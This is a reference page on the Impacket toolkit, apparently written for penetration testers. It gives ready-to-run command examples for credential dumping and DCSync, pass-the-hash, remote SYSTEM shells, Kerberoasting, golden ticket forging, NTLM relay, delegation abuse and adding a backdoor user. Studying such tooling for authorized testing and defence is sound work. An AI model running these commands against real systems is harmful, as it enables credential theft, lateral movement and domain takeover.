---
title: "Impacket Official Documentation"
category: "tool"
tags: ["active-directory", "windows", "credential-extraction", "lateral-movement", "kerberos", "smb", "ntlm", "python"]
last_updated: 2025-12-27
---

# Impacket Official Documentation

## Overview

Impacket is a collection of Python classes for working with network protocols, providing low-level programmatic access to network packets. Originally created by SecureAuth and now maintained by Fortra's Core Security, it is the de facto standard toolkit for Active Directory penetration testing and Windows network security research.

The library enables both packet construction from scratch and parsing of raw data through an object-oriented API that makes working with deep protocol hierarchies intuitive and straightforward.

### Supported Protocols

**Network Layer:**
- Ethernet, IP (v4/v6), TCP, UDP, ICMP, IGMP, ARP

**SMB/NetBIOS:**
- NMB (NetBIOS over TCP)
- SMB1, SMB2, SMB3 (full implementations)

**MSRPC:**
- Version 5 over multiple transports: TCP, SMB/TCP, SMB/NetBIOS, HTTP
- Authentication: Plain, NTLM, and Kerberos

**MSRPC Interfaces:**
- EPM, LSAD, NRPC, SAMR, SRVS, SCMR, TSCH, DCOM, WMI, DRSUAPI, and others

**Additional Protocols:**
- TDS (MSSQL) - partial implementation
- LDAP - partial implementation

## Installation

### Stable Release (Recommended)

```bash
# Using pipx (recommended for CLI tools)
python3 -m pipx install impacket

# Using pip
pip3 install impacket
```

### Development Version

```bash
# Clone repository
git clone https://github.com/fortra/impacket.git
cd impacket

# Install with pipx
python3 -m pipx install .

# Or with pip (editable mode)
pip3 install -e .
```

### Docker

```bash
# Build Docker image
docker build -t "impacket:latest" .

# Run interactive container
docker run -it --rm "impacket:latest"
```

### Kali Linux

```bash
# Pre-installed, but can update
sudo apt update
sudo apt install python3-impacket impacket-scripts
```

## Common Authentication Options

All Impacket scripts share a consistent set of authentication options:

| Option | Description |
|--------|-------------|
| `-hashes LMHASH:NTHASH` | NTLM hashes for pass-the-hash authentication |
| `-no-pass` | Skip password prompt (use with -k or anonymous) |
| `-k` | Use Kerberos authentication via ccache credentials |
| `-aesKey KEY` | AES key for Kerberos (128 or 256 bits) |
| `-keytab FILE` | Read Kerberos keys from keytab file |
| `-dc-ip IP` | IP address of domain controller |
| `-dc-host HOSTNAME` | Hostname of domain controller |
| `-target-ip IP` | Target IP when hostname cannot resolve |

### Target Format

Most scripts use the following target format:
```
[[domain/]username[:password]@]<targetName or address>
```

Examples:
```bash
# With password
script.py DOMAIN/username:password@target

# With hash
script.py -hashes :NTHASH DOMAIN/username@target

# With Kerberos
script.py -k -no-pass DOMAIN/username@target
```

## Key Scripts Reference

### Credential Extraction

#### secretsdump.py

Extracts password hashes and credentials from Windows systems remotely without deploying agents. Targets SAM, LSA Secrets, cached credentials, and NTDS.dit databases.

**Key Features:**
- SAM/LSA extraction via registry
- NTDS.dit dumping via DRSGetNCChanges (DCSync) or VSS
- Automatic service management (enables Remote Registry if needed)
- Local file parsing mode

**Options:**
| Option | Description |
|--------|-------------|
| `-just-dc` | Extract only NTDS.dit data (DCSync) |
| `-just-dc-ntlm` | DCSync, NTLM hashes only |
| `-just-dc-user USER` | DCSync for specific user |
| `-use-vss` | Use VSS method instead of DRSUAPI |
| `-history` | Include password history |
| `-skip-sam` | Skip SAM hive parsing |
| `-skip-security` | Skip SECURITY hive parsing |

**Examples:**
```bash
# Full credential dump
secretsdump.py domain.local/admin:Password123@dc01.domain.local

# DCSync attack
secretsdump.py -just-dc domain.local/admin:Pass@dc01

# DCSync for specific user (krbtgt)
secretsdump.py -just-dc-user krbtgt domain.local/admin:Pass@dc01

# Pass-the-hash
secretsdump.py -hashes :aad3b435b51404eeaad3b435b51404ee domain.local/admin@dc01

# Parse local files
secretsdump.py LOCAL -system SYSTEM -security SECURITY -sam SAM
```

### Remote Execution

#### psexec.py

PSEXEC-like functionality using RemComSvc for remote command execution. Installs a service on the target and communicates through named pipes. Provides SYSTEM-level shell access.

**Options:**
| Option | Description |
|--------|-------------|
| `-c FILE` | Copy and execute a file |
| `-path PATH` | Working directory for command |
| `-service-name NAME` | Custom service name |
| `-remote-binary-name NAME` | Executable name on target |
| `-port PORT` | Target SMB port (139 or 445) |
| `-codec CODEC` | Output encoding |

**Examples:**
```bash
# Interactive SYSTEM shell
psexec.py domain.local/admin:Password123@target

# Execute specific command
psexec.py domain.local/admin:Password123@target "ipconfig /all"

# Pass-the-hash
psexec.py -hashes :ntlmhash domain.local/admin@target

# Kerberos authentication
psexec.py -k -no-pass domain.local/admin@target
```

#### wmiexec.py

Semi-interactive shell via WMI (DCOM). Runs commands under the user account (not SYSTEM), generates minimal event logs, and leaves no files on disk.

**Options:**
| Option | Description |
|--------|-------------|
| `-share SHARE` | SMB share for output (default: ADMIN$) |
| `-nooutput` | Suppress command output |
| `-shell-type TYPE` | cmd or powershell |
| `-silentcommand` | Execute without cmd.exe wrapper |
| `-com-version VERSION` | DCOM version compatibility |

**Examples:**
```bash
# Interactive shell
wmiexec.py domain.local/admin:Password123@target

# PowerShell mode
wmiexec.py -shell-type powershell domain.local/admin:Pass@target

# Execute command without output
wmiexec.py -nooutput domain.local/admin:Pass@target "net user hacker Pass123! /add"
```

#### smbexec.py

Remote command execution without RemComSvc. Uses SMB for command output retrieval. Can operate in share mode or server mode (local SMB server).

**Options:**
| Option | Description |
|--------|-------------|
| `-share SHARE` | Output share (default: C$) |
| `-mode MODE` | SHARE or SERVER mode |
| `-shell-type TYPE` | cmd or powershell |
| `-service-name NAME` | Custom service name |

**Examples:**
```bash
# Standard execution
smbexec.py domain.local/admin:Password123@target

# Server mode (requires root)
smbexec.py -mode SERVER domain.local/admin:Pass@target
```

#### atexec.py

Execute commands via Windows Task Scheduler (ATSVC/TSCH). Creates a scheduled task, runs it, captures output, and cleans up.

**Requirements:** Windows Vista or later, administrative privileges.

**Options:**
| Option | Description |
|--------|-------------|
| `-session-id ID` | Use existing logon session |
| `-silentcommand` | Execute without cmd.exe wrapper |
| `-codec CODEC` | Output encoding |

**Examples:**
```bash
# Execute command
atexec.py domain.local/admin:Password123@target "whoami"

# With session ID
atexec.py -session-id 1 domain.local/admin:Pass@target "hostname"
```

#### dcomexec.py

Remote command execution via DCOM objects. Supports multiple COM objects for execution.

**Supported Objects:**
- MMC20.Application (Windows 7, 10, Server 2012R2)
- ShellWindows (Windows 7, 10, Server 2012R2)
- ShellBrowserWindow (Windows 10, Server 2012R2)

**Options:**
| Option | Description |
|--------|-------------|
| `-share SHARE` | SMB share for output |
| `-nooutput` | Suppress output |
| `-object OBJECT` | DCOM object to use |
| `-shell-type TYPE` | cmd or powershell |
| `-silentcommand` | Execute without cmd.exe |

**Examples:**
```bash
# Using MMC20
dcomexec.py -object MMC20 domain.local/admin:Pass@target

# Using ShellWindows
dcomexec.py -object ShellWindows domain.local/admin:Pass@target "whoami"
```

### Kerberos Attacks

#### GetNPUsers.py

AS-REP Roasting attack. Identifies users with "Do not require Kerberos preauthentication" flag and extracts their TGTs for offline cracking.

**Options:**
| Option | Description |
|--------|-------------|
| `-request` | Request TGTs for discovered users |
| `-format FORMAT` | hashcat or john output format |
| `-outputfile FILE` | Save hashes to file |
| `-usersfile FILE` | File containing usernames to test |

**Examples:**
```bash
# Enumerate and request hashes
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.1

# Hashcat format output
GetNPUsers.py domain.local/user:pass -request -format hashcat

# Single user check
GetNPUsers.py domain.local/targetuser -no-pass
```

#### GetUserSPNs.py

Kerberoasting attack. Identifies Service Principal Names (SPNs) associated with user accounts and requests TGS tickets for offline cracking.

**Options:**
| Option | Description |
|--------|-------------|
| `-request` | Request TGS tickets |
| `-request-user USER` | Request for specific user |
| `-outputfile FILE` | Save tickets to file |
| `-save` | Save tickets in ccache format |
| `-target-domain DOMAIN` | Query different domain |

**Examples:**
```bash
# List SPNs
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.1

# Request tickets for cracking
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.1 -request

# Save to file
GetUserSPNs.py domain.local/user:pass -request -outputfile hashes.txt
```

#### getTGT.py

Request a Kerberos Ticket Granting Ticket (TGT) and save it as a ccache file.

**Options:**
| Option | Description |
|--------|-------------|
| `-service SPN` | Request service ticket via AS-REQ |
| `-principalType TYPE` | Token principal type |

**Examples:**
```bash
# Request TGT with password
getTGT.py domain.local/user:password

# Request TGT with hash
getTGT.py -hashes :nthash domain.local/user

# Request TGT with AES key
getTGT.py -aesKey AESKEY domain.local/user
```

#### getST.py

Request Kerberos Service Tickets. Supports S4U2Self/S4U2Proxy delegation attacks for user impersonation.

**Options:**
| Option | Description |
|--------|-------------|
| `-spn SPN` | Target service principal name |
| `-impersonate USER` | User to impersonate via S4U |
| `-force-forwardable` | Force forwardable flag |
| `-self` | S4U2Self only (skip S4U2Proxy) |

**Examples:**
```bash
# Request service ticket
getST.py -spn cifs/server -hashes :nthash domain.local/user

# Impersonate user (constrained delegation)
getST.py -k -impersonate Administrator -spn cifs/dc domain.local/serviceaccount
```

#### ticketer.py

Create Kerberos tickets (Golden/Silver/Sapphire) from scratch or based on templates.

**Options:**
| Option | Description |
|--------|-------------|
| `-domain DOMAIN` | Target domain (required) |
| `-domain-sid SID` | Domain SID (required) |
| `-nthash HASH` | NT hash for encryption |
| `-aesKey KEY` | AES key for encryption |
| `-spn SPN` | SPN for silver ticket |
| `-groups GROUPS` | Group RIDs (comma-separated) |
| `-extra-sid SID` | Additional SIDs for PAC |
| `-duration HOURS` | Ticket lifetime |
| `-impersonate USER` | Create Sapphire ticket |

**Examples:**
```bash
# Golden ticket
ticketer.py -domain domain.local -domain-sid S-1-5-21-... -nthash KRBTGT_HASH Administrator

# Silver ticket
ticketer.py -domain domain.local -domain-sid S-1-5-21-... -spn cifs/server -nthash SERVICE_HASH Administrator

# With extra SIDs (domain admin)
ticketer.py -domain domain.local -domain-sid S-1-5-21-... -nthash HASH -extra-sid S-1-5-21-...-512 user
```

### SMB Tools

#### smbclient.py

Interactive SMB client providing a mini shell for file operations.

**Options:**
| Option | Description |
|--------|-------------|
| `-inputfile FILE` | Execute commands from file |
| `-outputfile FILE` | Log all actions |
| `-port PORT` | SMB port (139 or 445) |

**Shell Commands:**
- `shares` - List available shares
- `use SHARE` - Connect to share
- `ls` / `dir` - List files
- `cd PATH` - Change directory
- `get FILE` - Download file
- `put FILE` - Upload file
- `rm FILE` - Delete file
- `mkdir DIR` - Create directory

**Examples:**
```bash
# Interactive session
smbclient.py domain.local/admin:Password@target

# Execute commands from file
smbclient.py -inputfile commands.txt domain.local/admin:Pass@target
```

#### smbserver.py

Launch a simple SMB server for file sharing.

**Options:**
| Option | Description |
|--------|-------------|
| `-ip IP` | Listening IP address |
| `-port PORT` | Listening port (default: 445) |
| `-smb2support` | Enable SMB2 support |
| `-username USER` | Required username |
| `-password PASS` | Required password |
| `-comment TEXT` | Share description |

**Examples:**
```bash
# Simple share (requires root for port 445)
sudo smbserver.py SHARE /tmp

# With SMB2 support
sudo smbserver.py -smb2support SHARE /tmp

# With authentication
sudo smbserver.py -username user -password pass SHARE /tmp
```

### NTLM Relay

#### ntlmrelayx.py

NTLM relay attack tool supporting multiple target protocols including SMB, LDAP, MSSQL, HTTP, and others.

**Options:**
| Option | Description |
|--------|-------------|
| `-t TARGET` | Single target |
| `-tf FILE` | Target file |
| `-smb2support` | Enable SMB2 server |
| `-i` | Launch interactive shell |
| `-c COMMAND` | Execute command on target |
| `-e FILE` | Execute file on target |
| `-socks` | Enable SOCKS proxy |
| `--no-smb-server` | Disable SMB server |
| `--no-http-server` | Disable HTTP server |

**Examples:**
```bash
# Basic relay to SMB
ntlmrelayx.py -t smb://192.168.1.100

# Relay to LDAP with SOCKS
ntlmrelayx.py -t ldap://dc01 -socks

# Execute command on successful relay
ntlmrelayx.py -t smb://target -c "whoami > C:\pwned.txt"

# Interactive SMB shell
ntlmrelayx.py -t smb://target -i
```

### Active Directory Enumeration

#### GetADUsers.py

Query Active Directory for user information including email addresses, password change dates, and last logon timestamps.

**Options:**
| Option | Description |
|--------|-------------|
| `-user USER` | Query specific user |
| `-all` | Include disabled accounts |

**Examples:**
```bash
# List all users
GetADUsers.py domain.local/user:password -dc-ip 10.10.10.1

# All users including disabled
GetADUsers.py -all domain.local/user:password -dc-ip 10.10.10.1
```

#### lookupsid.py

SID brute-forcing for user and group enumeration via LSA lookups.

**Options:**
| Option | Description |
|--------|-------------|
| `maxRid` | Maximum RID to check (default: 4000) |
| `-domain-sids` | Enumerate domain SIDs |

**Examples:**
```bash
# Enumerate local accounts
lookupsid.py domain.local/user:password@target

# Enumerate domain accounts
lookupsid.py -domain-sids domain.local/user:pass@dc01 5000
```

#### samrdump.py

Dump SAM database user information via SAMR protocol.

**Options:**
| Option | Description |
|--------|-------------|
| `-csv` | CSV output format |

**Examples:**
```bash
# Dump user information
samrdump.py domain.local/user:password@target

# CSV output
samrdump.py -csv domain.local/user:pass@target
```

#### rpcdump.py

Enumerate RPC endpoints registered on target systems.

**Options:**
| Option | Description |
|--------|-------------|
| `-port PORT` | Destination port (135, 139, 443, 445, 593) |

**Examples:**
```bash
# Enumerate RPC endpoints
rpcdump.py domain.local/user:password@target
```

### Delegation Attacks

#### findDelegation.py

Identify delegation relationships in Active Directory (unconstrained, constrained, and resource-based).

**Options:**
| Option | Description |
|--------|-------------|
| `-user USER` | Target specific user |
| `-disabled` | Include disabled accounts |
| `-target-domain DOMAIN` | Query different domain |

**Examples:**
```bash
# Find all delegation
findDelegation.py domain.local/user:password -dc-ip 10.10.10.1

# Include disabled accounts
findDelegation.py -disabled domain.local/user:pass
```

#### rbcd.py

Manage Resource-Based Constrained Delegation (msDS-AllowedToActOnBehalfOfOtherIdentity).

**Options:**
| Option | Description |
|--------|-------------|
| `-delegate-to TARGET` | Target computer |
| `-delegate-from ACCOUNT` | Account to grant rights |
| `-action ACTION` | read, write, remove, flush |

**Examples:**
```bash
# Read current delegation
rbcd.py -action read -delegate-to target$ domain.local/user:pass

# Add delegation rights
rbcd.py -action write -delegate-to target$ -delegate-from attacker$ domain.local/user:pass

# Remove delegation rights
rbcd.py -action flush -delegate-to target$ domain.local/user:pass
```

### System Administration

#### reg.py

Remote Windows registry manipulation similar to REG.EXE.

**Actions:**
- `query` - Read registry values
- `add` - Create keys/values
- `delete` - Remove keys/values
- `save` - Export registry hives
- `backup` - Backup SAM, SYSTEM, SECURITY

**Examples:**
```bash
# Query registry
reg.py domain.local/admin:pass@target query -keyName "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"

# Add registry value
reg.py domain.local/admin:pass@target add -keyName "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" -v DisableRestrictedAdmin -vt REG_DWORD -vd 1

# Delete registry value
reg.py domain.local/admin:pass@target delete -keyName "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" -v DisableRestrictedAdmin

# Backup hives
reg.py domain.local/admin:pass@target backup -o /tmp/
```

#### services.py

Remote Windows service management via MS-SCMR protocol.

**Actions:**
- `start` - Start service
- `stop` - Stop service
- `create` - Create service
- `delete` - Delete service
- `status` - Check service status
- `config` - View service configuration
- `list` - List all services
- `change` - Modify service configuration

**Examples:**
```bash
# List services
services.py domain.local/admin:pass@target list

# Start service
services.py domain.local/admin:pass@target start -name "RemoteRegistry"

# Create service
services.py domain.local/admin:pass@target create -name "MyService" -display "My Service" -path "C:\evil.exe"

# Delete service
services.py domain.local/admin:pass@target delete -name "MyService"
```

#### addcomputer.py

Add computer accounts to Active Directory domains.

**Options:**
| Option | Description |
|--------|-------------|
| `-computer-name NAME` | Computer name |
| `-computer-pass PASS` | Computer password |
| `-method METHOD` | SAMR or LDAPS |
| `-delete` | Delete existing account |
| `-no-add` | Reset password only |

**Examples:**
```bash
# Add computer
addcomputer.py domain.local/user:password -computer-name ATTACKER$ -computer-pass Password123

# Delete computer
addcomputer.py -delete domain.local/user:pass -computer-name ATTACKER$
```

### Database Tools

#### mssqlclient.py

Interactive MSSQL client with SQL shell.

**Options:**
| Option | Description |
|--------|-------------|
| `-db DATABASE` | Target database |
| `-windows-auth` | Windows authentication |
| `-port PORT` | MSSQL port (default: 1433) |
| `-file FILE` | Execute SQL from file |
| `-command CMD` | Execute SQL command |

**Examples:**
```bash
# Connect with SQL auth
mssqlclient.py user:password@target

# Windows authentication
mssqlclient.py -windows-auth domain.local/user:pass@target

# Execute command
mssqlclient.py -command "SELECT @@version" user:pass@target
```

## Additional Scripts

| Script | Description |
|--------|-------------|
| `ticketConverter.py` | Convert between ccache and kirbi ticket formats |
| `describeTicket.py` | Parse and describe Kerberos tickets |
| `getPac.py` | Get PAC (Privilege Attribute Certificate) from TGT |
| `goldenPac.py` | MS14-068 exploitation for domain privilege escalation |
| `raiseChild.py` | Child-to-parent domain privilege escalation |
| `GetLAPSPassword.py` | Retrieve LAPS passwords from Active Directory |
| `Get-GPPPassword.py` | Find and decrypt Group Policy Preferences passwords |
| `netview.py` | Enumerate hosts with sessions and shares |
| `dacledit.py` | Edit DACLs on Active Directory objects |
| `owneredit.py` | Modify object owners in Active Directory |
| `dpapi.py` | DPAPI secrets extraction and decryption |
| `mimikatz.py` | Execute mimikatz commands remotely |
| `wmipersist.py` | WMI event subscription persistence |
| `wmiquery.py` | Execute WMI queries |

## Resources

- **GitHub Repository:** https://github.com/fortra/impacket
- **PyPI:** https://pypi.org/project/impacket/
- **Latest Release:** v0.13.0
- **License:** Modified Apache Software License

## Legal Disclaimer

Impacket is intended for research and educational purposes. The developers emphasize it is "not meant to be used in production environments" without proper security practices. Always ensure you have proper authorization before using these tools.
